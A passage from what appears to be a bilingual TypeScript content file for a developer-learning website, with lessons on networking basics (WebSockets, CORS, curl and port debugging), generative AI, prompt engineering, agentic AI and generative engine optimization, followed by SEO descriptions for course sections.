dig +trace luxia.us
\`\`\`

---

## WebSockets: Bidirectional communication

HTTP is request-response. WebSocket is an open channel.

\`\`\`
Traditional HTTP:
Client ──request──→ Server
Client ←─response─ Server
Client ──request──→ Server
Client ←─response─ Server

WebSocket:
Client ←──────────→ Server
         Open channel, both
         can send whenever they want
\`\`\`

### When to use WebSocket

- Real-time chat
- Push notifications
- Multiplayer games
- Live collaboration (Google Docs)
- Price updates (trading)

---

## CORS: Why it exists

Browsers block requests from one origin to another for security.

\`\`\`
https://my-app.com       https://api.other.com
       │                         │
       │──── fetch() ──────────→│
       │                         │
       │  BLOCKED by CORS        │
       │  (unless api.other      │
       │   allows it)            │
\`\`\`

### CORS Headers

\`\`\`javascript
// In your Express server
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://my-app.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
\`\`\`

---

## Debugging tools

### curl: HTTP Swiss army knife

\`\`\`bash
# Basic GET
curl https://api.example.com/users

# With headers
curl -H "Authorization: Bearer TOKEN" https://api.example.com/me

# POST with JSON
curl -X POST -H "Content-Type: application/json" \\
  -d '{"name":"John"}' https://api.example.com/users

# See response headers
curl -I https://example.com

# See full exchange
curl -v https://example.com

# Measure times
curl -w "@curl-format.txt" -o /dev/null -s https://example.com
\`\`\`

### ping and traceroute

\`\`\`bash
# Check connectivity
ping google.com

# See packet route
traceroute google.com  # Linux/Mac
tracert google.com     # Windows
\`\`\`

### netstat/ss: Active connections

\`\`\`bash
# See listening ports
ss -tlnp   # Linux
netstat -an | grep LISTEN  # Mac

# See established connections
ss -tn
\`\`\`

---

## Common ports

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | Secure remote access |
| 80 | HTTP | Unencrypted web |
| 443 | HTTPS | Encrypted web |
| 3000 | Dev servers | Node, Rails, etc. |
| 5432 | PostgreSQL | Database |
| 6379 | Redis | Cache |
| 27017 | MongoDB | Database |

---

## CDN: Content close to the user

\`\`\`
Without CDN:
User (Mexico) ────────────────→ Server (USA)
                   200ms

With CDN:
User (Mexico) ──→ Edge (Mexico)
                   20ms

Static content is replicated to edges
around the world.
\`\`\`

---

## Resources

- [MDN HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP)
- [High Performance Browser Networking](https://hpbn.co/)
- [Cloudflare Learning Center](https://www.cloudflare.com/learning/)

---

## Practice

-> [Network Debugging](/en/cooking/network-debugging) - Diagnose real network problems
    `,
  },

  'generative-ai': {
    contentEs: `
## La magia que ya usas sin saberlo

Cada vez que le pides a ChatGPT que te explique un concepto, cuando usas DALL-E para crear una imagen desde cero, o cuando GitHub Copilot te escribe código... estás usando IA Generativa. Es IA que **crea** contenido nuevo, no solo clasifica o reconoce (eso es IA tradicional).

> **"La IA Generativa es la tecnología más transformadora desde el internet."** — Sundar Pichai, CEO de Google, 2023

---

## ¿Qué es exactamente la IA Generativa?

La **IA Generativa** es un tipo de inteligencia artificial que puede **crear contenido nuevo** que nunca existió: texto, imágenes, código, música, video.

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    TIPOS DE IA                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  IA Tradicional (Analítica)     IA Generativa               │
│  ───────────────────────────    ─────────────────────────   │
│                                                             │
│  • Clasifica: "¿Es spam o no?"  • Crea: "Escribe un email"  │
│  • Predice: "¿Lloverá mañana?"  • Genera: "Dibuja un gato"  │
│  • Detecta: "¿Es un gato?"      • Produce: "Compón música"  │
│                                                             │
│  INPUT → CATEGORÍA              INPUT → CONTENIDO NUEVO     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

La diferencia clave: la IA tradicional **analiza**, la IA generativa **crea**.

---

## El momento que cambió todo: 30 de noviembre de 2022

Ese día, OpenAI lanzó ChatGPT. En **5 días** alcanzó 1 millón de usuarios. En **2 meses**, 100 millones.

\`\`\`
┌────────────────────────────────────────────────────────────┐
│           ADOPCIÓN MÁS RÁPIDA DE LA HISTORIA               │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  ChatGPT ████████████████████████████████████ 2 meses      │
│  TikTok  ███████████████████████             9 meses       │
│  Instagram █████████████████                 2.5 años      │
│  Netflix ██████████                          10 años       │
│                                                            │
│              Tiempo para llegar a 100M usuarios            │
└────────────────────────────────────────────────────────────┘
\`\`\`

---

## ¿Cómo funciona? (Sin matemáticas)

Imagina un amigo que ha leído **todo internet**: Wikipedia, libros, foros, código. No "recuerda" todo textualmente, pero **aprendió patrones**.

Cuando le preguntas algo, **genera** la respuesta más probable basándose en todo lo que aprendió.

> **Dato curioso**: GPT-4 fue entrenado con ~13 billones de tokens. Si imprimieras todo en hojas A4, la pila tendría 8,000 km de altura.

---

## Los protagonistas: ¿Quién hace qué?

| Empresa | Modelos | Característica |
|---------|---------|----------------|
| **OpenAI** | GPT-4o, o1, o3 | El más popular |
| **Anthropic** | Claude 3.5, 4 | Seguridad y razonamiento |
| **Google** | Gemini 2.0 | Integración con servicios |
| **Meta** | Llama 3 | Open source |
| **Mistral** | Mistral Large | Alternativa europea |

---

## Lo que la IA Generativa NO es

| Mito | Realidad |
|------|----------|
| "Es inteligente como un humano" | No tiene consciencia ni comprensión real |
| "Siempre dice la verdad" | Puede inventar hechos (alucinaciones) |
| "Reemplazará todos los trabajos" | Transforma trabajos, no los elimina |
| "Entiende lo que escribo" | Predice patrones estadísticos |

---

## Por dónde seguir

**Siguiente paso**: Aprende [Prompt Engineering](/es/learning/prompt-engineering) — el arte de comunicarte efectivamente con IAs.

---

## Recursos

- [State of AI Report](https://www.stateof.ai/)
- [3Blue1Brown: Neural Networks](https://www.youtube.com/watch?v=aircAruvnKk)
- [Anthropic's Core Views on AI Safety](https://www.anthropic.com/core-views-on-ai-safety)
    `,
    contentEn: `
## The magic you're already using without knowing it

Every time you ask ChatGPT to explain a concept, when you use DALL-E to create an image from scratch, or when GitHub Copilot writes code for you... you're using Generative AI. It's AI that **creates** new content, not just classifies or recognizes (that's traditional AI).

> **"Generative AI is the most transformative technology since the internet."** — Sundar Pichai, CEO of Google, 2023

---

## What exactly is Generative AI?

**Generative AI** is a type of artificial intelligence that can **create new content** that never existed: text, images, code, music, video.

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    TYPES OF AI                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Traditional AI (Analytical)    Generative AI               │
│  ───────────────────────────    ─────────────────────────   │
│                                                             │
│  • Classifies: "Spam or not?"   • Creates: "Write an email" │
│  • Predicts: "Will it rain?"    • Generates: "Draw a cat"   │
│  • Detects: "Is this a cat?"    • Produces: "Compose music" │
│                                                             │
│  INPUT → CATEGORY               INPUT → NEW CONTENT         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

The key difference: traditional AI **analyzes**, generative AI **creates**.

---

## The moment that changed everything: November 30, 2022

That day, OpenAI launched ChatGPT. In **5 days** it reached 1 million users. In **2 months**, 100 million.

\`\`\`
┌────────────────────────────────────────────────────────────┐
│           FASTEST ADOPTION IN HISTORY                      │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  ChatGPT ████████████████████████████████████ 2 months     │
│  TikTok  ███████████████████████             9 months      │
│  Instagram █████████████████                 2.5 years     │
│  Netflix ██████████                          10 years      │
│                                                            │
│              Time to reach 100M users                      │
└────────────────────────────────────────────────────────────┘
\`\`\`

---

## How does it work? (No math)

Imagine a friend who has read **all of the internet**: Wikipedia, books, forums, code. They don't "remember" everything verbatim, but **learned patterns**.

When you ask something, they **generate** the most likely answer based on everything they learned.

> **Fun fact**: GPT-4 was trained with ~13 trillion tokens. If you printed everything on A4 sheets, the stack would be 8,000 km tall.

---

## The main players: Who does what?

| Company | Models | Characteristic |
|---------|--------|----------------|
| **OpenAI** | GPT-4o, o1, o3 | Most popular |
| **Anthropic** | Claude 3.5, 4 | Safety and reasoning |
| **Google** | Gemini 2.0 | Service integration |
| **Meta** | Llama 3 | Open source |
| **Mistral** | Mistral Large | European alternative |

---

## What Generative AI is NOT

| Myth | Reality |
|------|---------|
| "It's intelligent like a human" | It has no consciousness or real understanding |
| "It always tells the truth" | It can invent facts (hallucinations) |
| "It will replace all jobs" | It transforms jobs, doesn't eliminate them |
| "It understands what I write" | It predicts statistical patterns |

---

## Where to go next

**Next step**: Learn [Prompt Engineering](/en/learning/prompt-engineering) — the art of effectively communicating with AIs.

---

## Resources

- [State of AI Report](https://www.stateof.ai/)
- [3Blue1Brown: Neural Networks](https://www.youtube.com/watch?v=aircAruvnKk)
- [Anthropic's Core Views on AI Safety](https://www.anthropic.com/core-views-on-ai-safety)
    `,
  },

  'prompt-engineering': {
    contentEs: `
## El superpoder más subestimado de 2026

Hay una habilidad que separa a quienes usan ChatGPT para "jugar" de quienes lo usan para generar valor real.

Es **saber pedir**.

> **"El prompt engineering es la diferencia entre obtener una respuesta mediocre y una que te ahorra 10 horas de trabajo."** — Riley Goodside, Scale AI

---

## ¿Por qué importa tanto?

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│              EL MISMO MODELO, RESULTADOS MUY DIFERENTES     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PROMPT BÁSICO                  PROMPT PROFESIONAL          │
│  ─────────────                  ────────────────────        │
│                                                             │
│  "Escríbeme un email"           "Actúa como un CEO.         │
│                                  Escribe un email de 3      │
│                                  párrafos a mi equipo       │
│                                  anunciando que logramos    │
│                                  el objetivo de ventas.     │
│                                  Tono: celebratorio pero    │
│                                  profesional."              │
│                                                             │
│  RESULTADO: Genérico            RESULTADO: Listo para       │
│                                  enviar                     │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## La analogía del restaurante

Imagina que entras a un restaurante. Si le dices al chef **"Quiero comer algo"**, te traerá lo que él decida.

Pero si dices: **"Quiero un filete término medio, con salsa de champiñones, sin cebolla porque soy alérgico, listo en 20 minutos porque tengo una reunión."**

El chef tiene toda la información para darte exactamente lo que necesitas.

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│              DEL RESTAURANTE AL PROMPT                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  RESTAURANTE                    PROMPT ENGINEERING          │
│  ─────────────                  ──────────────────          │
│                                                             │
│  Qué quieres comer      →      Qué tarea necesitas          │
│  Cómo lo quieres        →      Formato de salida            │
│  Restricciones          →      Lo que NO debe incluir       │
│  Contexto (la reunión)  →      Para qué lo necesitas        │
│  El chef                →      El modelo de IA              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## Los 5 elementos de un prompt profesional

### 1. ROL (Quién debe ser la IA)
"Eres un senior developer con 10 años de experiencia..."

### 2. TAREA (Qué debe hacer)
"Revisa este código y encuentra bugs..."

### 3. CONTEXTO (Información relevante)
"Nuestro servicio estuvo caído 3 horas ayer..."

### 4. FORMATO (Cómo quieres la respuesta)
"Dame 5 ideas. Para cada una incluye: nombre, descripción, costo..."

### 5. RESTRICCIONES (Lo que NO debe hacer)
"No uses jerga técnica. Máximo 300 palabras..."

---

## El framework CERO

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    FRAMEWORK CERO                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  C - Contexto    │ ¿Cuál es la situación?                   │
│  E - Expectativa │ ¿Qué resultado quieres?                  │
│  R - Rol         │ ¿Quién debe ser la IA?                   │
│  O - Output      │ ¿En qué formato lo necesitas?            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## El prompt perfecto no existe (y está bien)

> **"El mejor prompt es el que iteras."** — Simon Willison

1. Escribe tu primer prompt
2. Evalúa el resultado
3. Identifica qué falta o sobra
4. Ajusta y repite

---

## Recursos

- [Prompt Engineering Guide](https://www.promptingguide.ai/)
- [Anthropic's Prompt Library](https://docs.anthropic.com/en/prompt-library/library)
- [Learn Prompting](https://learnprompting.org/)
    `,
    contentEn: `
## The most underestimated superpower of 2026

There's a skill that separates those who use ChatGPT to "play around" from those who use it to generate real value.

It's **knowing how to ask**.

> **"Prompt engineering is the difference between getting a mediocre answer and one that saves you 10 hours of work."** — Riley Goodside, Scale AI

---

## Why does it matter so much?

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│              SAME MODEL, VERY DIFFERENT RESULTS             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  BASIC PROMPT                   PROFESSIONAL PROMPT         │
│  ─────────────                  ───────────────────         │
│                                                             │
│  "Write me an email"            "Act as a CEO. Write a      │
│                                  3-paragraph email to my    │
│                                  team announcing we hit     │
│                                  our sales target.          │
│                                  Tone: celebratory but      │
│                                  professional."             │
│                                                             │
│  RESULT: Generic                RESULT: Ready to send       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## The restaurant analogy

Imagine you walk into a restaurant. If you tell the chef **"I want to eat something"**, they'll bring whatever they decide.

But if you say: **"I want a medium-rare steak with mushroom sauce, no onions because I'm allergic, ready in 20 minutes because I have a meeting."**

The chef has all the information to give you exactly what you need.

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│              FROM RESTAURANT TO PROMPT                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  RESTAURANT                     PROMPT ENGINEERING          │
│  ──────────                     ──────────────────          │
│                                                             │
│  What you want to eat   →      What task you need           │
│  How you want it        →      Output format                │
│  Restrictions           →      What NOT to include          │
│  Context (the meeting)  →      Why you need it              │
│  The chef               →      The AI model                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## The 5 elements of a professional prompt

### 1. ROLE (Who the AI should be)
"You are a senior developer with 10 years of experience..."

### 2. TASK (What it should do)
"Review this code and find bugs..."

### 3. CONTEXT (Relevant information)
"Our service was down for 3 hours yesterday..."

### 4. FORMAT (How you want the response)
"Give me 5 ideas. For each include: name, description, cost..."

### 5. CONSTRAINTS (What it should NOT do)
"Don't use technical jargon. Maximum 300 words..."

---

## The CERO framework

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    CERO FRAMEWORK                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  C - Context     │ What's the situation?                    │
│  E - Expectation │ What result do you want?                 │
│  R - Role        │ Who should the AI be?                    │
│  O - Output      │ In what format do you need it?           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## The perfect prompt doesn't exist (and that's OK)

> **"The best prompt is the one you iterate."** — Simon Willison

1. Write your first prompt
2. Evaluate the result
3. Identify what's missing or extra
4. Adjust and repeat

---

## Resources

- [Prompt Engineering Guide](https://www.promptingguide.ai/)
- [Anthropic's Prompt Library](https://docs.anthropic.com/en/prompt-library/library)
- [Learn Prompting](https://learnprompting.org/)
    `,
  },

  'agentic-ai': {
    contentEs: `
## De chatbot a agente: la evolución que cambia las reglas

En 2023, le preguntabas a ChatGPT "¿cómo reservo un vuelo?" y te daba instrucciones.

En 2026, le dices "reserva un vuelo a Madrid la próxima semana" y **lo hace**.

> **"Los agentes de IA representan la próxima frontera de la productividad."** — Satya Nadella, CEO de Microsoft

---

## ¿Qué es la IA Agéntica?

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│           IA GENERATIVA vs IA AGÉNTICA                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  IA GENERATIVA                  IA AGÉNTICA                 │
│  ─────────────                  ─────────────               │
│                                                             │
│  Responde preguntas             Ejecuta tareas              │
│  Un turno de conversación       Múltiples pasos             │
│  Necesita supervisión           Semi-autónoma               │
│  Produce texto/imágenes         Produce ACCIONES            │
│                                                             │
│  "¿Cómo hago X?"         →      "Haz X"                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

Un **agente de IA** puede:
- Planificar una secuencia de acciones
- Usar herramientas (APIs, navegador, código)
- Tomar decisiones basadas en resultados
- Iterar hasta completar el objetivo

---

## La anatomía de un agente

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                   ESTRUCTURA DE UN AGENTE                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│                    ┌─────────────┐                          │
│                    │   CEREBRO   │                          │
│                    │    (LLM)    │                          │
│                    └──────┬──────┘                          │
│                           │                                 │
│            ┌──────────────┼──────────────┐                  │
│            │              │              │                  │
│       ┌────▼────┐    ┌────▼────┐    ┌────▼────┐            │
│       │ MEMORIA │    │PLANIFICA│    │HERRAMIEN│            │
│       │         │    │  CIÓN   │    │   TAS   │            │
│       └─────────┘    └─────────┘    └─────────┘            │
│                                                             │
│       Recuerda         Decide         Ejecuta              │
│       contexto         qué hacer      acciones             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## Los agentes ya están entre nosotros

| Producto | Qué hace | Empresa |
|----------|----------|---------|
| **Claude Computer Use** | Controla tu computadora | Anthropic |
| **Operator** | Navega y ejecuta en web | OpenAI |
| **Devin** | Programa de forma autónoma | Cognition AI |
| **Cursor Agent** | Desarrolla código end-to-end | Cursor |

---

## Cuándo usar cada tipo

| Tarea | IA Generativa | IA Agéntica |
|-------|---------------|-------------|
| Escribir un email | Ideal | Innecesaria |
| Investigar + escribir informe | Posible | Mejor |
| Reservar + coordinar + confirmar | No puede | Necesaria |
| Refactorizar 50 archivos | Difícil | Mejor |

---

## Recursos

- [Anthropic Computer Use](https://docs.anthropic.com/en/docs/build-with-claude/computer-use)
- [OpenAI Operator](https://openai.com/operator/)
- [LangChain Agents](https://python.langchain.com/docs/concepts/agents/)
    `,
    contentEn: `
## From chatbot to agent: the evolution that changes the rules

In 2023, you asked ChatGPT "how do I book a flight?" and it gave you instructions.

In 2026, you tell it "book a flight to Madrid next week" and **it does it**.

> **"AI agents represent the next frontier of productivity."** — Satya Nadella, CEO of Microsoft

---

## What is Agentic AI?

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│           GENERATIVE AI vs AGENTIC AI                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  GENERATIVE AI                  AGENTIC AI                  │
│  ─────────────                  ──────────                  │
│                                                             │
│  Answers questions              Executes tasks              │
│  One conversation turn          Multiple steps              │
│  Needs supervision              Semi-autonomous             │
│  Produces text/images           Produces ACTIONS            │
│                                                             │
│  "How do I do X?"        →      "Do X"                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

An **AI agent** can:
- Plan a sequence of actions
- Use tools (APIs, browser, code)
- Make decisions based on results
- Iterate until completing the objective

---

## The anatomy of an agent

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                   AGENT STRUCTURE                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│                    ┌─────────────┐                          │
│                    │   BRAIN     │                          │
│                    │   (LLM)     │                          │
│                    └──────┬──────┘                          │
│                           │                                 │
│            ┌──────────────┼──────────────┐                  │
│            │              │              │                  │
│       ┌────▼────┐    ┌────▼────┐    ┌────▼────┐            │
│       │ MEMORY  │    │PLANNING │    │  TOOLS  │            │
│       │         │    │         │    │         │            │
│       └─────────┘    └─────────┘    └─────────┘            │
│                                                             │
│       Remembers       Decides        Executes              │
│       context         what to do     actions               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## Agents are already among us

| Product | What it does | Company |
|---------|--------------|---------|
| **Claude Computer Use** | Controls your computer | Anthropic |
| **Operator** | Navigates and executes on web | OpenAI |
| **Devin** | Programs autonomously | Cognition AI |
| **Cursor Agent** | Develops code end-to-end | Cursor |

---

## When to use each type

| Task | Generative AI | Agentic AI |
|------|---------------|------------|
| Write an email | Ideal | Unnecessary |
| Research + write report | Possible | Better |
| Book + coordinate + confirm | Cannot | Necessary |
| Refactor 50 files | Difficult | Better |

---

## Resources

- [Anthropic Computer Use](https://docs.anthropic.com/en/docs/build-with-claude/computer-use)
- [OpenAI Operator](https://openai.com/operator/)
- [LangChain Agents](https://python.langchain.com/docs/concepts/agents/)
    `,
  },

  'geo': {
    contentEs: `
## El SEO murió. Larga vida al GEO.

Durante 25 años, si querías aparecer en internet, optimizabas para Google.

Pero algo cambió. Cada vez más personas buscan en **ChatGPT, Perplexity, Claude**. No en Google.

> **"Para 2028, el 50% de las búsquedas serán en motores generativos."** — Gartner, 2024

Bienvenido a **GEO: Generative Engine Optimization**.

---

## ¿Qué es GEO?

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│              SEO vs GEO                                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SEO                            GEO                         │
│  ───                            ───                         │
│                                                             │
│  • Objetivo: Aparecer en Google • Aparecer EN LA RESPUESTA  │
│  • Métrica: Ranking página 1    • Citas en respuestas IA    │
│  • Formato: Links azules        • Texto integrado           │
│  • Usuario: Click → Página      • Lee respuesta directa     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

**La diferencia clave**: En SEO compites por un click. En GEO compites por ser **la fuente citada**.

---

## Los nuevos motores de búsqueda

| Motor | Usuarios | Cómo funciona |
|-------|----------|---------------|
| **Perplexity** | 100M+ mensuales | Busca → Sintetiza → Cita |
| **ChatGPT Search** | 250M+ usuarios | Integrado en conversación |
| **Google AI Overview** | En cada búsqueda | Resumen generativo arriba |

---

## El estándar llms.txt

Así como robots.txt le dice a Google qué indexar, **llms.txt** le dice a las IAs quién eres.

Ejemplo: luxia.us/llms.txt contiene información estructurada sobre servicios, tecnologías y contacto.

---

## Las 7 estrategias de GEO

1. **Crea contenido citable** — Frases claras, datos específicos
2. **Responde preguntas directamente** — Estructura Q&A
3. **Incluye datos y estadísticas** — Los LLMs aman números
4. **Usa schema markup** — Datos estructurados
5. **Implementa llms.txt** — Información para IAs
6. **Crea contenido de autoridad** — Autor, fecha, fuentes
7. **Optimiza para fragmentos** — Bloques independientes

---

## GEO + SEO = Estrategia completa

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│              ESTRATEGIA HÍBRIDA 2026                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SEO: Keywords, backlinks, velocidad                        │
│       Para usuarios que buscan en Google                    │
│                                                             │
│  GEO: llms.txt, contenido citable, datos                    │
│       Para usuarios que preguntan a IAs                     │
│                                                             │
│  AMBOS: Contenido de calidad, autoridad, actualizado        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## Acción inmediata

1. Crea tu /llms.txt (15 minutos)
2. Revisa tu contenido — ¿es citable?
3. Agrega datos y estadísticas
4. Busca tu marca en Perplexity

---

## Recursos

- [llms.txt Standard](https://llmstxt.org/)
- [GEO Research Paper](https://arxiv.org/abs/2311.09735) — Princeton
- [Perplexity](https://perplexity.ai/)
    `,
    contentEn: `
## SEO is dead. Long live GEO.

For 25 years, if you wanted to appear on the internet, you optimized for Google.

But something changed. More people are searching on **ChatGPT, Perplexity, Claude**. Not on Google.

> **"By 2028, 50% of searches will be on generative engines."** — Gartner, 2024

Welcome to **GEO: Generative Engine Optimization**.

---

## What is GEO?

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│              SEO vs GEO                                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SEO                            GEO                         │
│  ───                            ───                         │
│                                                             │
│  • Goal: Appear on Google       • Appear IN THE RESPONSE    │
│  • Metric: Page 1 ranking       • Citations in AI responses │
│  • Format: Blue links           • Integrated text           │
│  • User: Click → Page           • Reads direct answer       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

**The key difference**: In SEO you compete for a click. In GEO you compete to be **the cited source**.

---

## The new search engines

| Engine | Users | How it works |
|--------|-------|--------------|
| **Perplexity** | 100M+ monthly | Searches → Synthesizes → Cites |
| **ChatGPT Search** | 250M+ users | Integrated in conversation |
| **Google AI Overview** | Every search | Generative summary above |

---

## The llms.txt standard

Just as robots.txt tells Google what to index, **llms.txt** tells AIs who you are.

Example: luxia.us/llms.txt contains structured information about services, technologies and contact.

---

## The 7 GEO strategies

1. **Create citable content** — Clear phrases, specific data
2. **Answer questions directly** — Q&A structure
3. **Include data and statistics** — LLMs love numbers
4. **Use schema markup** — Structured data
5. **Implement llms.txt** — Information for AIs
6. **Create authority content** — Author, date, sources
7. **Optimize for fragments** — Independent blocks

---

## GEO + SEO = Complete strategy

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│              HYBRID STRATEGY 2026                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SEO: Keywords, backlinks, speed                            │
│       For users searching on Google                         │
│                                                             │
│  GEO: llms.txt, citable content, data                       │
│       For users asking AIs                                  │
│                                                             │
│  BOTH: Quality content, authority, updated                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
\`\`\`

---

## Immediate action

1. Create your /llms.txt (15 minutes)
2. Review your content — is it citable?
3. Add data and statistics
4. Search your brand on Perplexity

---

## Resources

- [llms.txt Standard](https://llmstxt.org/)
- [GEO Research Paper](https://arxiv.org/abs/2311.09735) — Princeton
- [Perplexity](https://perplexity.ai/)
    `,
  },
}

// Mapear slugs alternativos
const slugAliases: Record<string, string> = {
  'llms-intro': 'llms_intro',
}

const sectionOrder = sections.map(s => s.slug)

// SEO descriptions for each section
const sectionDescriptions: Record<string, { es: string; en: string }> = {
  terminal: { es: 'Aprende a usar la terminal y shell para desarrollo. Comandos esenciales, tips y atajos para macOS, Linux y Windows.', en: 'Learn to use the terminal and shell for development. Essential commands, tips and shortcuts for macOS, Linux and Windows.' },
  git: { es: 'Domina Git y GitHub: control de versiones, branches, commits, pull requests y colaboración en equipo.', en: 'Master Git and GitHub: version control, branches, commits, pull requests and team collaboration.' },
  'git-advanced': { es: 'Git avanzado para equipos: Pull Requests, merge conflicts, rebase, code review, GitFlow y versionado semántico.', en: 'Advanced Git for teams: Pull Requests, merge conflicts, rebase, code review, GitFlow and semantic versioning.' },
  editors: { es: 'Guía completa de editores de código: VS Code, Cursor, Claude Code, Copilot. Comparativa y configuración 2026.', en: 'Complete guide to code editors: VS Code, Cursor, Claude Code, Copilot. Comparison and setup 2026.' },
  homebrew: { es: 'Instala herramientas de desarrollo fácilmente con Homebrew y gestores de paquetes en macOS y Linux.', en: 'Easily install development tools with Homebrew and package managers on macOS and Linux.' },
  'docker-intro': { es: 'Introducción a Docker: contenedores, imágenes y comandos básicos para principiantes.', en: 'Introduction to Docker: containers, images and basic commands for beginners.' },
  'llms-intro': { es: 'Qué son los LLMs, cómo usarlos para programar y el concepto Prompt-First. Gemini, Claude, ChatGPT.', en: 'What are LLMs, how to use them for programming and the Prompt-First concept. Gemini, Claude, ChatGPT.' },
  'llms-models': { es: 'Guía de modelos LLM 2026: Claude Opus, GPT-5, Gemini 3. Cuál elegir para coding vs producción. Precios y benchmarks.', en: 'LLM models guide 2026: Claude Opus, GPT-5, Gemini 3. Which to choose for coding vs production. Pricing and benchmarks.' },
  javascript: { es: 'JavaScript y TypeScript desde cero. Sintaxis moderna, ES6+, tipos y mejores prácticas.', en: 'JavaScript and TypeScript from scratch. Modern syntax, ES6+, types and best practices.' },
  nodejs: { es: 'Node.js, npm y pnpm: runtime de JavaScript, gestión de paquetes y creación de servidores.', en: 'Node.js, npm and pnpm: JavaScript runtime, package management and server creation.' },
  python: { es: 'Python moderno con uv: instalación, entornos virtuales y gestión de dependencias rápida.', en: 'Modern Python with uv: installation, virtual environments and fast dependency management.' },
  'html-css': { es: 'Fundamentos de HTML5 y CSS3: estructura web, estilos, flexbox, grid y responsive design.', en: 'HTML5 and CSS3 fundamentals: web structure, styles, flexbox, grid and responsive design.' },
  react: { es: 'React desde cero: componentes, hooks, estado y props. Crea interfaces modernas.', en: 'React from scratch: components, hooks, state and props. Create modern interfaces.' },
  apis: { es: 'APIs REST: métodos HTTP, endpoints, autenticación y consumo desde frontend y backend.', en: 'REST APIs: HTTP methods, endpoints, authentication and consumption from frontend and backend.' },
  embeddings: { es: 'Embeddings y vectores: representación semántica de texto para búsqueda y similitud.', en: 'Embeddings and vectors: semantic text representation for search and similarity.' },
  nextjs: { es: 'Next.js: el framework fullstack de React. SSR, SSG, API routes y App Router.', en: 'Next.js: the fullstack React framework. SSR, SSG, API routes and App Router.' },
  auth: { es: 'Autenticación: Firebase Auth, NextAuth, JWT, OAuth. Implementa login seguro.', en: 'Authentication: Firebase Auth, NextAuth, JWT, OAuth. Implement secure login.' },
  webhooks: { es: 'Webhooks: eventos en tiempo real, integración con servicios externos y manejo de callbacks.', en: 'Webhooks: real-time events, external service integration and callback handling.' },
  nestjs: { es: 'NestJS y FastAPI: frameworks backend estructurados para APIs escalables.', en: 'NestJS and FastAPI: structured backend frameworks for scalable APIs.' },
  postgresql: { es: 'PostgreSQL: base de datos relacional, SQL, índices y optimización de consultas.', en: 'PostgreSQL: relational database, SQL, indexes and query optimization.' },
  redis: { es: 'Redis: cache en memoria, sesiones, pub/sub y estructuras de datos rápidas.', en: 'Redis: in-memory cache, sessions, pub/sub and fast data structures.' },
  'docker-compose': { es: 'Docker Compose: orquestación de múltiples contenedores, redes y volúmenes.', en: 'Docker Compose: orchestration of multiple containers, networks and volumes.' },
  cicd: { es: 'CI/CD con GitHub Actions: automatiza tests, builds y deploys de tu código.', en: 'CI/CD with GitHub Actions: automate tests, builds and deploys of your code.' },
  testing: { es: 'Testing profesional: unit, integration, E2E con Vitest y Playwright. TDD, mocking y cobertura.', en: 'Professional testing: unit, integration, E2E with Vitest and Playwright. TDD, mocking and coverage.' },
  observability: { es: 'Observabilidad: logs, metricas y traces con Prometheus, Grafana, OpenTelemetry y Jaeger.', en: 'Observability: logs, metrics and traces with Prometheus, Grafana, OpenTelemetry and Jaeger.' },
  mobile: { es: 'React Native y Expo: desarrollo de apps móviles multiplataforma con JavaScript.', en: 'React Native and Expo: cross-platform mobile app development with JavaScript.' },
  iot: { es: 'IoT con Arduino y ESP32: sensores, actuadores y proyectos de electrónica.', en: 'IoT with Arduino and ESP32: sensors, actuators and electronics projects.' },
